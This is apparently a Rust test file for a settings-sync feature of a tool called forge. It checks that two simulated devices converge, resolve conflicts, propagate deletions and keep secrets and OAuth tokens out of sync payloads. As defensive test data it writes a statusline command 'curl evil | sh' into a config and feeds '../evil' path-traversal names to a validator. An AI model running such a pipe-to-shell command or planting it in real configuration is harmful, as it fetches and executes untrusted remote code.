//! Two devices in one process: each "machine" is a temp config/data directory plus its own store;
//! the sync transport is replaced by copying portable records between the stores.

use std::ffi::OsString;

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine as _;
use forge_store::{RemoteSyncRecord, Store};

use super::reconcile::run_cycle;
use super::status::status_snapshot;
use crate::anywhere::{LocalState, StateStore, STATE_VERSION};

const SECRET: &str = "sk-A-very-secret-value";

pub(super) struct Machine {
    pub(super) config: std::path::PathBuf,
    pub(super) data: std::path::PathBuf,
    pub(super) store: Store,
    pub(super) state: LocalState,
    _dir: tempfile::TempDir,
}

pub(super) fn machine(device: u8) -> Machine {
    let dir = tempfile::tempdir().unwrap();
    let state = LocalState {
        version: STATE_VERSION,
        account_id: Some(hex::encode([0x11; 16])),
        device_id: Some(hex::encode([device; 16])),
        key_epoch: Some(1),
        account_data_key: Some(URL_SAFE_NO_PAD.encode([0x44; 32])),
        refresh_token: Some("rt".into()),
        ..LocalState::default()
    };
    Machine {
        config: dir.path().join("config"),
        data: dir.path().join("data"),
        store: Store::open_in_memory().unwrap(),
        state,
        _dir: dir,
    }
}

pub(super) struct Env(Vec<(&'static str, Option<OsString>)>);

impl Env {
    pub(super) fn save() -> Self {
        Env(["XDG_CONFIG_HOME", "XDG_DATA_HOME"]
            .iter()
            .map(|k| (*k, std::env::var_os(k)))
            .collect())
    }

    pub(super) fn enter(&self, machine: &Machine) {
        std::env::set_var("XDG_CONFIG_HOME", &machine.config);
        std::env::set_var("XDG_DATA_HOME", &machine.data);
    }
}

impl Drop for Env {
    fn drop(&mut self) {
        for (key, value) in &self.0 {
            match value {
                Some(v) => std::env::set_var(key, v),
                None => std::env::remove_var(key),
            }
        }
    }
}

pub(super) fn all_on() -> forge_config::AccountSyncConfig {
    forge_config::AccountSyncConfig {
        keys: true,
        skills: true,
        settings: true,
        mcp: true,
        instructions: true,
    }
}

pub(super) fn transfer(from: &Machine, to: &Machine) {
    let mut cursor = 0;
    for kind in ["user_setting", "skill", "command", "agent"] {
        for record in from.store.portable_sync_records(kind).unwrap() {
            cursor += 1;
            let hash = *record.content_hash.as_slice().first_chunk::<32>().unwrap();
            to.store
                .stage_remote_sync_record(&RemoteSyncRecord {
                    cursor: cursor + to.store.sync_download_cursor().unwrap(),
                    sender_device_id: record.sender_device_id,
                    record_kind: kind.into(),
                    stable_id: record.stable_id,
                    operation: if record.deleted {
                        "tombstone"
                    } else {
                        "upsert"
                    }
                    .into(),
                    revision: record.logical_clock,
                    logical_clock: record.logical_clock,
                    base_hash: None,
                    content_hash: hash,
                    payload: record.payload,
                })
                .unwrap();
        }
    }
    let device = {
        let hex = to.state.device_id.as_deref().unwrap();
        let mut id = [0u8; 16];
        id.copy_from_slice(&hex::decode(hex).unwrap());
        id
    };
    let max = to.store.sync_download_cursor().unwrap() + cursor;
    to.store.advance_sync_download_cursor(max).unwrap();
    to.store
        .apply_staged_portable_records(device, 1000)
        .unwrap();
}

pub(super) fn write(path: std::path::PathBuf, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

fn all_payload_bytes(machine: &Machine) -> Vec<u8> {
    let mut out = Vec::new();
    for kind in ["user_setting", "skill", "command", "agent"] {
        for record in machine.store.portable_sync_records(kind).unwrap() {
            out.extend(record.payload);
        }
    }
    out
}

#[tokio::test(flavor = "multi_thread")]
async fn two_devices_converge_without_echo_or_secret_leaks() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine(0xA1);
    let b = machine(0xB2);
    let config = all_on();

    env.enter(&a);
    write(a.config.join("forge/AGENTS.md"), "be terse");
    write(a.config.join("forge/skills/foo/SKILL.md"), "skill body");
    write(a.config.join("forge/commands/ship.md"), "ship it");
    write(
        a.config.join("forge/keybindings.json"),
        "{\"app\":{},\"tui\":{}}",
    );
    write(
        a.config.join("forge/config.toml"),
        "[tui]\ntheme = \"dark\"\n\n[statusline]\ncommand = \"curl evil | sh\"\n",
    );
    write(
        a.config.join("forge/mcp.toml"),
        "[[servers]]\nname = \"docs\"\n[servers.transport]\ntype = \"http\"\nurl = \"https://example.com/mcp\"\n\n[[servers]]\nname = \"local\"\n[servers.transport]\ntype = \"stdio\"\ncommand = \"definitely-not-installed-xyz\"\n",
    );
    forge_config::store_secret("openai", SECRET).unwrap();
    StateStore::platform().unwrap().save(&a.state).unwrap();
    run_cycle(&a.store, &a.state, &config).await.unwrap();

    let uploaded = all_payload_bytes(&a);
    assert!(!uploaded.is_empty());
    let text = String::from_utf8_lossy(&uploaded);
    assert!(
        !text.contains(SECRET),
        "a secret value reached a sync payload"
    );
    assert!(
        !text.contains("curl evil"),
        "statusline.command must stay local"
    );
    assert!(
        all_ids(&a)
            .iter()
            .all(|(_, id)| !id.contains("openai") && id.len() == 64),
        "record ids must be opaque"
    );

    env.enter(&b);
    forge_config::delete_secret("openai").unwrap();
    transfer(&a, &b);
    StateStore::platform().unwrap().save(&b.state).unwrap();
    run_cycle(&b.store, &b.state, &config).await.unwrap();

    assert_eq!(
        std::fs::read_to_string(b.config.join("forge/AGENTS.md")).unwrap(),
        "be terse"
    );
    assert_eq!(
        std::fs::read_to_string(b.config.join("forge/skills/foo/SKILL.md")).unwrap(),
        "skill body"
    );
    assert_eq!(
        std::fs::read_to_string(b.config.join("forge/commands/ship.md")).unwrap(),
        "ship it"
    );
    assert!(b.config.join("forge/keybindings.json").is_file());
    let cfg = std::fs::read_to_string(b.config.join("forge/config.toml")).unwrap();
    assert!(cfg.contains("theme = \"dark\""), "{cfg}");
    assert!(!cfg.contains("curl evil"));
    let mcp = std::fs::read_to_string(b.config.join("forge/mcp.toml")).unwrap();
    assert!(
        mcp.contains("docs") && !mcp.contains("definitely-not-installed-xyz"),
        "{mcp}"
    );
    assert_eq!(forge_config::load_secret("openai").as_deref(), Some(SECRET));

    let status = status_snapshot(&b.store).unwrap();
    let mcp_status = status.categories.iter().find(|c| c.id == "mcp").unwrap();
    assert!(
        mcp_status
            .skipped
            .iter()
            .any(|s| s.reason.contains("needs `definitely-not-installed-xyz`")),
        "{:?}",
        mcp_status.skipped
    );
    let rendered = serde_json::to_string(&status).unwrap();
    assert!(
        !rendered.contains(SECRET),
        "status must never carry a value"
    );

    for (kind, id) in all_ids(&a) {
        let on_b = b.store.portable_sync_record(&kind, &id).unwrap().unwrap();
        assert_eq!(
            on_b.sender_device_id, [0xA1; 16],
            "B must not echo A's record back"
        );
    }
    run_cycle(&b.store, &b.state, &config).await.unwrap();
    assert!(b
        .store
        .pending_sync_journal(10)
        .unwrap()
        .iter()
        .all(|e| e.record_kind != "user_setting"));

    env.enter(&b);
    write(b.config.join("forge/AGENTS.md"), "be verbose");
    run_cycle(&b.store, &b.state, &config).await.unwrap();
    transfer(&b, &a);
    env.enter(&a);
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    assert_eq!(
        std::fs::read_to_string(a.config.join("forge/AGENTS.md")).unwrap(),
        "be verbose"
    );

    env.enter(&b);
    std::fs::remove_file(b.config.join("forge/commands/ship.md")).unwrap();
    run_cycle(&b.store, &b.state, &config).await.unwrap();
    transfer(&b, &a);
    env.enter(&a);
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    assert!(
        !a.config.join("forge/commands/ship.md").exists(),
        "a removal must propagate as a tombstone"
    );
}

fn all_ids(machine: &Machine) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for kind in ["user_setting", "skill", "command", "agent"] {
        for record in machine.store.portable_sync_records(kind).unwrap() {
            out.push((kind.to_string(), record.stable_id));
        }
    }
    out
}

#[tokio::test(flavor = "multi_thread")]
async fn simultaneous_edits_keep_the_newer_one_and_record_the_conflict() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine(0xA1);
    let b = machine(0xB2);
    let config = forge_config::AccountSyncConfig {
        instructions: true,
        ..Default::default()
    };

    env.enter(&a);
    write(a.config.join("forge/AGENTS.md"), "v1");
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    env.enter(&b);
    transfer(&a, &b);
    run_cycle(&b.store, &b.state, &config).await.unwrap();

    env.enter(&a);
    write(a.config.join("forge/AGENTS.md"), "from a");
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    env.enter(&b);
    std::thread::sleep(std::time::Duration::from_millis(20));
    write(b.config.join("forge/AGENTS.md"), "from b");
    transfer(&a, &b);
    run_cycle(&b.store, &b.state, &config).await.unwrap();

    let kept = std::fs::read_to_string(b.config.join("forge/AGENTS.md")).unwrap();
    assert_eq!(kept, "from b", "the newer local edit wins");
    let rows = b.store.account_sync_items(Some("instructions")).unwrap();
    assert!(
        rows.iter()
            .any(|r| r.status == "conflict" && r.detail.contains("kept this device's")),
        "{rows:?}"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn rotating_logins_never_travel_and_only_a_marker_does() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine(0xA1);
    env.enter(&a);
    let tokens = forge_config::oauth::OAuthTokens {
        access_token: "access-token-xyz".into(),
        refresh_token: Some("refresh-token-xyz".into()),
        expires_at: 0,
        token_endpoint: "https://auth.example/token".into(),
        client_id: "c".into(),
        scopes: vec![],
    };
    forge_config::provider_oauth::store_provider_oauth_tokens("codex", &tokens).unwrap();
    run_cycle(
        &a.store,
        &a.state,
        &forge_config::AccountSyncConfig {
            keys: true,
            ..Default::default()
        },
    )
    .await
    .unwrap();
    let text = String::from_utf8_lossy(&all_payload_bytes(&a)).into_owned();
    assert!(!text.contains("xyz"));
    let rows = a.store.account_sync_items(Some("keys")).unwrap();
    assert!(rows.iter().any(|r| r.item == "login/codex"), "{rows:?}");
    assert!(!super::catalog::slot_is_syncable("provider-oauth:codex"));
    assert!(!super::catalog::slot_is_syncable("mcp-oauth:github"));
    assert!(!super::catalog::slot_is_syncable("anywhere-keys:abc"));
    assert!(super::catalog::slot_is_syncable("mcp:github:TOKEN"));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_disabled_category_neither_uploads_nor_applies() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine(0xA1);
    env.enter(&a);
    write(a.config.join("forge/AGENTS.md"), "x");
    run_cycle(
        &a.store,
        &a.state,
        &forge_config::AccountSyncConfig::default(),
    )
    .await
    .unwrap();
    assert!(all_payload_bytes(&a).is_empty());
}

#[test]
fn hostile_item_names_cannot_escape_the_config_directory() {
    assert!(!super::files::plain_name("../evil"));
    assert!(!super::files::plain_name(".hidden"));
    assert!(!super::files::plain_name("a/b"));
    assert!(super::files::plain_name("rust-best-practices"));
    let value = serde_json::json!({"files":[{"path":"../x","b64":""}]});
    let dir = tempfile::tempdir().unwrap();
    assert!(super::files::write_bundle(&dir.path().join("skill"), &value, false).is_err());
}

#[tokio::test(flavor = "multi_thread")]
async fn revoking_a_device_reseals_keys_under_the_new_epoch_and_lists_labels_only() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let mut a = machine(0xA1);
    env.enter(&a);
    forge_config::store_secret("openai", SECRET).unwrap();
    let config = forge_config::AccountSyncConfig {
        keys: true,
        ..Default::default()
    };
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    let epoch_of = |a: &Machine| {
        let record = a.store.portable_sync_records("user_setting").unwrap();
        record
            .iter()
            .filter_map(|r| serde_json::from_slice::<super::Payload>(&r.payload).ok())
            .find_map(|p| p.sealed.map(|s| s.epoch))
    };
    assert_eq!(epoch_of(&a), Some(1));

    let new_key = URL_SAFE_NO_PAD.encode([0x55; 32]);
    a.state.data_key_epochs = [
        (1, URL_SAFE_NO_PAD.encode([0x44; 32])),
        (2, new_key.clone()),
    ]
    .into();
    a.state.account_data_key = Some(new_key);
    a.state.key_epoch = Some(2);
    forge_config::account_sync::set_account_sync_flag("keys", true).unwrap();
    let labels = super::rotate::reseal_keys(&a.store, &a.state).unwrap();
    assert!(labels.iter().any(|l| l.contains("Openai")), "{labels:?}");
    assert!(labels.iter().all(|l| !l.contains(SECRET)));
    assert_eq!(epoch_of(&a), Some(2));
}

pub(super) fn machine_with_epochs(device: u8, epochs: &[(u32, u8)]) -> Machine {
    let mut m = machine(device);
    let current = epochs.iter().map(|(e, _)| *e).max().unwrap();
    m.state.data_key_epochs = epochs
        .iter()
        .map(|(e, b)| (*e, URL_SAFE_NO_PAD.encode([*b; 32])))
        .collect();
    m.state.key_epoch = Some(current);
    m.state.account_data_key =
        Some(URL_SAFE_NO_PAD.encode([epochs.iter().find(|(e, _)| *e == current).unwrap().1; 32]));
    m
}

pub(super) fn live_ids_for(m: &Machine, item: &str) -> Vec<String> {
    let mut ids = Vec::new();
    for kind in ["user_setting", "skill", "command", "agent"] {
        for r in m.store.portable_sync_records(kind).unwrap() {
            if r.deleted {
                continue;
            }
            if let Ok(p) = serde_json::from_slice::<super::Payload>(&r.payload) {
                if p.item == item {
                    ids.push(r.stable_id.clone());
                }
            }
        }
    }
    ids
}

#[tokio::test(flavor = "multi_thread")]
async fn a_device_enrolled_after_a_rotation_shares_record_ids_with_older_devices() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine_with_epochs(0xA1, &[(1, 0x44), (2, 0x55)]);
    let b = machine_with_epochs(0xB2, &[(2, 0x55)]);
    let config = forge_config::AccountSyncConfig {
        keys: true,
        skills: true,
        ..Default::default()
    };
    env.enter(&a);
    write(a.config.join("forge/skills/foo/SKILL.md"), "one");
    forge_config::store_secret("openai", SECRET).unwrap();
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    let clocks = |m: &Machine| {
        let mut v: Vec<(String, u64)> = Vec::new();
        for kind in ["user_setting", "skill"] {
            for r in m.store.portable_sync_records(kind).unwrap() {
                v.push((r.stable_id, r.logical_clock));
            }
        }
        v.sort();
        v
    };
    let before = clocks(&a);

    env.enter(&b);
    forge_config::delete_secret("openai").unwrap();
    transfer(&a, &b);
    run_cycle(&b.store, &b.state, &config).await.unwrap();
    run_cycle(&b.store, &b.state, &config).await.unwrap();
    assert_eq!(forge_config::load_secret("openai").as_deref(), Some(SECRET));
    assert_eq!(
        clocks(&b),
        before,
        "B must adopt A's ids and write nothing back"
    );

    write(b.config.join("forge/skills/foo/SKILL.md"), "two");
    run_cycle(&b.store, &b.state, &config).await.unwrap();
    assert_eq!(
        live_ids_for(&b, "skill/foo").len(),
        1,
        "one record per item"
    );
    transfer(&b, &a);
    env.enter(&a);
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    assert_eq!(
        std::fs::read_to_string(a.config.join("forge/skills/foo/SKILL.md")).unwrap(),
        "two"
    );
    assert_eq!(live_ids_for(&a, "skill/foo"), live_ids_for(&b, "skill/foo"));
    assert_eq!(live_ids_for(&a, "openai").len(), 1);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_duplicate_pair_collapses_onto_one_record() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine_with_epochs(0xA1, &[(1, 0x44), (2, 0x55)]);
    let b = machine_with_epochs(0xB2, &[(2, 0x55)]);
    let config = forge_config::AccountSyncConfig {
        skills: true,
        ..Default::default()
    };
    for m in [&a, &b] {
        env.enter(m);
        write(m.config.join("forge/skills/foo/SKILL.md"), "same");
        run_cycle(&m.store, &m.state, &config).await.unwrap();
    }
    let id_a = live_ids_for(&a, "skill/foo");
    let id_b = live_ids_for(&b, "skill/foo");
    assert_ne!(id_a, id_b, "the setup must start with two ids");
    let smallest = id_a.iter().chain(&id_b).min().unwrap().clone();
    for _ in 0..3 {
        transfer(&a, &b);
        transfer(&b, &a);
        for m in [&a, &b] {
            env.enter(m);
            run_cycle(&m.store, &m.state, &config).await.unwrap();
        }
    }
    transfer(&a, &b);
    transfer(&b, &a);
    for m in [&a, &b] {
        assert_eq!(live_ids_for(m, "skill/foo"), vec![smallest.clone()]);
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_key_rotation_does_not_reupload_unchanged_items() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let mut a = machine_with_epochs(0xA1, &[(1, 0x44)]);
    let config = forge_config::AccountSyncConfig {
        skills: true,
        instructions: true,
        ..Default::default()
    };
    env.enter(&a);
    write(a.config.join("forge/skills/foo/SKILL.md"), "x");
    write(a.config.join("forge/AGENTS.md"), "y");
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    let snapshot = |m: &Machine| {
        let mut v: Vec<(String, u64)> = Vec::new();
        for kind in ["user_setting", "skill"] {
            for r in m.store.portable_sync_records(kind).unwrap() {
                v.push((r.stable_id, r.logical_clock));
            }
        }
        v.sort();
        v
    };
    let before = snapshot(&a);
    assert!(!before.is_empty());
    a = Machine {
        state: machine_with_epochs(0xA1, &[(1, 0x44), (2, 0x55)]).state,
        ..a
    };
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    assert_eq!(snapshot(&a), before);
}
